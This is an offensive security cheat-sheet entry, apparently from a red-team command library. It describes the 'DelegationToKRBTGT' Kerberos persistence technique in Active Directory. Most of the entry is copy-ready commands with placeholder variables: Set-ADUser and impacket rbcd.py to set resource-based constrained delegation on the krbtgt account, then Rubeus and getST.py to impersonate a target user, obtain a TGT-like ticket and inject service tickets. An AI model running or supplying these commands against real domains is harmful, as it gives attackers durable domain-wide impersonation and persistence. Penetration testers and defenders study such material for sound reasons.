---
technique: DelegationToKRBTGT
category: kerberos-persistence
targets: krbtgt
protocols: Kerberos, LDAP
remote_capable: true
tags: kerberos persistence rbcd krbtgt s4u tgt ad
---

# DelegationToKRBTGT

Delegation to KRBTGT configures RBCD on the `krbtgt` account so a controlled SPN-bearing account can request a KRBTGT service ticket on behalf of another user. Because a KRBTGT service ticket functions like a TGT, this creates on-demand Kerberos persistence for users not protected from delegation.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| krbtgt write access | Domain admin-level rights are usually required to modify RBCD on `krbtgt` |
| Controlled SPN | The delegating account needs an SPN unless using an SPN-less RBCD variant |
| Target eligibility | Protected Users and sensitive-for-delegation accounts block this abuse |

## Windows

### Set-ADUser RBCD on krbtgt

#powershell #rsat #rbcd

Configure `krbtgt` to allow delegation from the controlled account.

```powershell title:"Configure RBCD delegation to krbtgt"
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount "$controlled_account"
```
<!-- cheat
var controlled_account
-->

### Rubeus S4U to krbtgt

#powershell #rubeus #s4u

Request a KRBTGT service ticket on behalf of the target user using the controlled account.

```powershell title:"Request KRBTGT S4U ticket with Rubeus"
.\Rubeus.exe s4u /nowrap /impersonateuser:"$target_user" /msdsspn:"krbtgt" /domain:"$domain" /user:"$controlled_account" /rc4:$nt_hash
```
<!-- cheat
import domain_ip
var target_user
var controlled_account
var nt_hash
-->

### Rubeus asktgs with KRBTGT ticket

#powershell #rubeus #ptt

Use the KRBTGT ticket as a TGT to request a service ticket and inject it.

```powershell title:"Request service ticket with delegated KRBTGT ticket"
.\Rubeus.exe asktgs /service:"$service_spn" /ticket:"$ticket_b64" /ptt
```
<!-- cheat
var service_spn
var ticket_b64
-->

## Linux

### rbcd.py write krbtgt

#python #impacket #rbcd

Configure RBCD on `krbtgt` from a privileged account.

```sh title:"Configure krbtgt RBCD with rbcd.py"
rbcd.py -delegate-from "$controlled_account" -delegate-to "krbtgt" -dc-ip "$rhost_ip" -action write "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_account
-->

### getST KRBTGT S4U

#python #impacket #s4u

Request a KRBTGT service ticket on behalf of the target user.

```sh title:"Request delegated KRBTGT ticket with getST"
getST.py -spn "KRBTGT" -impersonate "$target_user" -dc-ip "$rhost_ip" "$domain/$controlled_account:$controlled_password"
```
<!-- cheat
import domain_ip
var target_user
var controlled_account
var controlled_password
-->

### getST service from delegated TGT

#python #impacket #ptt

Use the delegated KRBTGT ticket cache to request a service ticket for a target service.

```sh title:"Request service ticket from delegated KRBTGT ccache"
KRB5CCNAME="$ccache_file" getST.py -spn "$service_spn" -k -no-pass "$domain/$target_user"
```
<!-- cheat
import domain_ip
var ccache_file
var service_spn
var target_user
-->
